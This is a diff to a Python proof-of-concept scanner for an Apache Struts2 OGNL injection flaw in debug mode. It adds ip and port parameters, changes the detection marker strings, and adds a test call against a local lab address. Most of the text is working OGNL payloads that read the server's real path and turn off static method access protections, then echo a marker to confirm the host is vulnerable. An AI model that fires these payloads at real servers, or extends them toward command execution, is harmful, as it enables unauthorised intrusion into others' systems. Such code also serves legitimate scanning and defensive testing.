@@ -4,13 +4,17 @@ import requests
 warnings.filterwarnings("ignore")
 
 
-def poc(url):
+def poc(url, **kwargs):
+    if kwargs.get('ip'):
+        url = 'http://' + kwargs.get('ip') + ':' + kwargs.get('port')
+    else:
+        url = url
     timeout = 10
     proxies = {'http': '127.0.0.1:9999'}
-    check = ['\Struts2-vuln-Goop', '/Struts2-vuln-Goop', '-Struts2-vuln-Goop', 'Unable to initialize device PRN']
+    check = ['Struts2-vuln-Goop1116', '-Struts2-vuln-Goop', 'Unable to initialize device PRN']
 
     poc_goop = [
-        r'''debug=command&expression=#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#a=#req.getSession(),#b=#a.getServletContext(),#c=#b.getRealPath("Struts2-vuln-Goop"),#matt=%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C#matt.getWriter().println(#c),#matt.getWriter().flush(),#matt.getWriter().close()''',
+        r'''debug=command&expression=#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#a=#req.getSession(),#b=#a.getServletContext(),#c=#b.getRealPath("Struts2-vuln-Goop"),#matt=%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C#matt.getWriter().print(#c),#matt.getWriter().print(1116),#matt.getWriter().flush(),#matt.getWriter().close()''',
         r'''debug=command&expression=%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23resp%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23resp.getWriter%28%29.println%28%27-Struts2-vuln%27%2b%27-Goop%27%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29'''
     ]
     headers = {
@@ -27,3 +31,8 @@ def poc(url):
                     return result
     except:
         pass
+
+
+if __name__ == '__main__':
+    a = poc("http://192.168.106.130:8080/ajax/example5.action")
+    print(a)
